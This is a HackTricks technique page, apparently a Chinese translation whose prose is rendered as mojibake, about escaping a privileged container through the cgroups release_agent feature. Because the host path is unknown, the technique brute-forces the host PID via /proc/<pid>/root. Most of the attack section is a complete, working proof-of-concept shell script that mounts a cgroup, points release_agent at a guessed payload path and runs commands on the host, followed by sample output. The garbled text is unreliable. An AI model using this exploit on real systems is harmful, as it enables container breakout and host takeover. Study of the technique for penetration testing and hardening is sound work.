<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


# å¼•è¨€

ä¹‹å‰çš„PoCsåœ¨å®¹å™¨é…ç½®äº†ä¸€ä¸ªæš´éœ²**å®Œæ•´ä¸»æœºæŒ‚è½½ç‚¹è·¯å¾„**çš„å­˜å‚¨é©±åŠ¨æ—¶å·¥ä½œæ­£å¸¸ï¼Œä¾‹å¦‚`overlayfs`ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›é…ç½®**å¹¶æ²¡æœ‰æ˜æ˜¾æš´éœ²ä¸»æœºæ–‡ä»¶ç³»ç»ŸæŒ‚è½½ç‚¹**ã€‚

åœ¨è¿™ä¸ªPoCä¸­ï¼Œæˆ‘ä»¬ä¸ä½¿ç”¨å®¹å™¨åœ¨ä¸»æœºæ–‡ä»¶ç³»ç»Ÿå†…çš„è·¯å¾„ï¼Œè€Œæ˜¯è¦åœ¨ä¸»æœºä¸­å‘ç°ä¸€ä¸ªå®¹å™¨PID

## å®¹å™¨æœªæš´éœ²åœ¨ä¸»æœºå†…è·¯å¾„ä½ç½®çš„ç¤ºä¾‹

### Kata å®¹å™¨
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) é»˜è®¤é€šè¿‡ `9pfs` æŒ‚è½½å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚è¿™ä¸ä¼šæ³„éœ² Kata Containers è™šæ‹Ÿæœºä¸­å®¹å™¨æ–‡ä»¶ç³»ç»Ÿä½ç½®çš„ä»»ä½•ä¿¡æ¯ã€‚

### Device Mapper
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
# PoC

å…³é”®ä¿¡æ¯æ˜¯éœ€è¦**ç›¸å¯¹äºå®¹å™¨å®¿ä¸»æœºçš„å®Œæ•´è·¯å¾„ï¼Œç”¨äºåœ¨å®¹å™¨å†…æ‰§è¡Œçš„æ–‡ä»¶**ã€‚å¦‚æœæ— æ³•ä»å®¹å™¨å†…çš„æŒ‚è½½ç‚¹è¾¨åˆ«å‡ºè¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¿…é¡»å¦å¯»ä»–æ³•ã€‚

## /proc/\<pid>/root

Linuxçš„`/proc`ä¼ªæ–‡ä»¶ç³»ç»Ÿæš´éœ²äº†ç³»ç»Ÿä¸Šæ‰€æœ‰è¿›ç¨‹çš„å†…æ ¸è¿›ç¨‹æ•°æ®ç»“æ„ï¼ŒåŒ…æ‹¬åœ¨ä¸åŒå‘½åç©ºé—´ä¸­è¿è¡Œçš„è¿›ç¨‹ï¼Œä¾‹å¦‚åœ¨å®¹å™¨å†…éƒ¨ã€‚å¯ä»¥é€šè¿‡åœ¨å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤å¹¶è®¿é—®å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹çš„`/proc`ç›®å½•æ¥å±•ç¤ºè¿™ä¸€ç‚¹ï¼šContainer
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
æ—æ³¨ï¼š`/proc/<pid>/root` æ•°æ®ç»“æ„æ›¾è®©æˆ‘å›°æƒ‘å¾ˆé•¿æ—¶é—´ï¼Œæˆ‘ä¸€ç›´ä¸æ˜ç™½ä¸ºä»€ä¹ˆæœ‰ä¸€ä¸ªæŒ‡å‘ `/` çš„ç¬¦å·é“¾æ¥ä¼šæœ‰ç”¨ï¼Œç›´åˆ°æˆ‘åœ¨æ‰‹å†Œé¡µä¸­è¯»åˆ°äº†å®é™…å®šä¹‰ï¼š

> /proc/\[pid]/root
>
> UNIXå’ŒLinuxæ”¯æŒæ¯ä¸ªè¿›ç¨‹æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•çš„æ¦‚å¿µï¼Œé€šè¿‡chroot(2)ç³»ç»Ÿè°ƒç”¨è®¾ç½®ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹æ ¹ç›®å½•çš„ç¬¦å·é“¾æ¥ï¼Œå¹¶ä¸”è¡Œä¸ºä¸exeå’Œfd/\*ç›¸åŒã€‚
>
> ä½†è¯·æ³¨æ„ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ã€‚å®ƒæä¾›äº†ä¸è¿›ç¨‹æœ¬èº«ç›¸åŒçš„æ–‡ä»¶ç³»ç»Ÿè§†å›¾ï¼ˆåŒ…æ‹¬å‘½åç©ºé—´å’Œæ¯ä¸ªè¿›ç¨‹çš„æŒ‚è½½é›†ï¼‰ã€‚

**`/proc/<pid>/root` ç¬¦å·é“¾æ¥å¯ä»¥ç”¨ä½œå®¹å™¨å†…ä»»ä½•æ–‡ä»¶çš„ä¸»æœºç›¸å¯¹è·¯å¾„**ï¼š
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
{% hint style="warning" %}
**è¿™æ”¹å˜äº†æ”»å‡»çš„è¦æ±‚ï¼Œä»çŸ¥é“å®¹å™¨å®¿ä¸»æœºç›¸å¯¹äºå®¹å™¨å†…çš„æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œå˜ä¸ºçŸ¥é“å®¹å™¨ä¸­**_**ä»»ä½•**_**è¿›ç¨‹çš„pidã€‚**
{% endhint %}

## Pid Bashing <a href="#pid-bashing" id="pid-bashing"></a>

è¿™å®é™…ä¸Šæ˜¯å®¹æ˜“çš„éƒ¨åˆ†ï¼ŒLinuxä¸­çš„è¿›ç¨‹idæ˜¯æ•°å­—çš„ï¼Œå¹¶ä¸”æ˜¯é¡ºåºåˆ†é…çš„ã€‚`init`è¿›ç¨‹è¢«åˆ†é…è¿›ç¨‹id `1`ï¼Œæ‰€æœ‰åç»­è¿›ç¨‹éƒ½è¢«åˆ†é…å¢é‡idã€‚**è¦è¯†åˆ«å®¹å™¨å†…è¿›ç¨‹çš„å®¿ä¸»è¿›ç¨‹idï¼Œå¯ä»¥ä½¿ç”¨æš´åŠ›å¢é‡æœç´¢**ï¼š
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
å®¿ä¸»æœº
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
## æ•´åˆæ‰€æœ‰æ­¥éª¤ <a href="#putting-it-all-together" id="putting-it-all-together"></a>

ä¸ºäº†å®Œæˆè¿™æ¬¡æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£æŠ€æœ¯æ¥**çŒœæµ‹è·¯å¾„ `/proc/<pid>/root/payload.sh` çš„ PID**ï¼Œåœ¨**æ¯æ¬¡è¿­ä»£**ä¸­å°†çŒœæµ‹çš„ pid **è·¯å¾„å†™å…¥ cgroups çš„ `release_agent` æ–‡ä»¶ï¼Œè§¦å‘ `release_agent`**ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦åˆ›å»ºäº†è¾“å‡ºæ–‡ä»¶ã€‚

è¿™ç§æŠ€æœ¯çš„å”¯ä¸€æ³¨æ„äº‹é¡¹æ˜¯å®ƒç»ä¸å¾®å¦™ï¼Œå¯èƒ½ä¼šä½¿ pid è®¡æ•°éå¸¸é«˜ã€‚ç”±äºæ²¡æœ‰é•¿æ—¶é—´è¿è¡Œçš„è¿›ç¨‹ä¿æŒè¿è¡Œï¼Œè¿™ _åº”è¯¥_ ä¸ä¼šå¼•èµ·å¯é æ€§é—®é¢˜ï¼Œä½†ä¸è¦å¼•ç”¨æˆ‘çš„è¯ã€‚

ä¸‹é¢çš„ PoC å®ç°äº†è¿™äº›æŠ€æœ¯ï¼Œæä¾›äº†ä¸€ä¸ªæ¯” Felix æœ€åˆçš„ PoC æ›´é€šç”¨çš„æ”»å‡»æ–¹æ³•ï¼Œç”¨äºåˆ©ç”¨ **cgroups çš„ `release_agent` åŠŸèƒ½** é€ƒç¦»ç‰¹æƒå®¹å™¨ï¼š
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
åœ¨ç‰¹æƒå®¹å™¨å†…æ‰§è¡Œ PoC åº”æä¾›ç±»ä¼¼äºä»¥ä¸‹çš„è¾“å‡ºï¼š
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# å‚è€ƒèµ„æ–™

* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
